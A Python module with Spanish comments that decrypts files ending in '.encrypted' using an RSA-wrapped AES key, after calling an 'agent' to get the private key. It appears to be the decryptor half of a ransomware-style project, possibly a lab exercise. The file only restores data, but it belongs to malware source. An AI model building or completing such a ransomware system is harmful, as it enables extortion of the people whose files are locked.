import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from find_files import find_files
import agent

def load_private_rsa_key(): 
    path_rsa_private_key = os.path.abspath("rsa_private.pem")
    with open(path_rsa_private_key, "rb") as clave_file:
        return RSA.import_key(clave_file.read())

def load_aes_key_encrypted():
    path_aes_key = os.path.abspath("aes_key_encrypted.bin")
    with open(path_aes_key, "rb") as clave_file:
        return clave_file.read()

def decrypt_aes_key_encrypted (rsa_private_key, aes_key_encrypted):
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    return cipher_rsa.decrypt(aes_key_encrypted)

def decrypt_file(file, aes_key_decrypted):
    try:
        with open(file, "rb") as f:
            iv_and_encrypted_data = f.read()
        iv = iv_and_encrypted_data[:16]  # El IV ocupa los primeros 16 bytes
        encrypted_data = iv_and_encrypted_data[16:]
        cipher = AES.new(aes_key_decrypted, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        with open(file, "wb") as f:
            f.write(decrypted_data)  # Sobrescribimos el archivo con los datos descifrados
        file_decrypted = file[:-10]  # Elimina la extensión '.encrypted'
        os.rename(file, file_decrypted) # Renombramos el archivo, eliminando la extensión '.encrypted'
        print(f"Archivo descifrado: {file} -> {file_decrypted}")
    except Exception as e:
        print(f"Error descifrando {file}: {e}")

def decrypt_files():
    agent.get_private_key()
    files = find_files() 
    rsa_private_key = load_private_rsa_key()
    aes_key_encrypted = load_aes_key_encrypted()
    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)
    for file in files:
        if file.endswith(".encrypted") and os.path.isfile(file):  # Verifica extensión y que es un archivo válido
            decrypt_file(file, aes_key)
    os.remove("aes_key_encrypted.bin") # Eliminar la clave AES cifrada después del proceso
    print("Archivos descifrados correctamente.")

